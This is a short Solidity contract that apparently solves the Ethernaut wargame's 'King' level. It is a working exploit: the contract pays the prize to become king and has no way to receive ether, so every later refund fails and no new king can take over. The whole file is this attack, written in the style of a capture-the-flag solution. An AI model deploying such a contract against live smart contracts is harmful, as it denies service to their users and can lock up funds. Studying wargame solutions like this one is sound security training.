// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title 9. KING
 * @dev Break the game to prevent any new king to take over.
 */

interface IKing {
    function prize() external returns (uint256);
}

// Simply make sure this contract can't receive ether and it will be impossible to pass the transfer function
// Become the new king, then stay there forever :)
contract FallenKing {
    address private immutable king;

    constructor(address _king) {
        king = _king;
    }

    function attack() external payable {
        uint256 prize = IKing(king).prize();
        (bool success, ) = king.call{value: prize}("");
        require(success, "Transfer failed");
    }
}
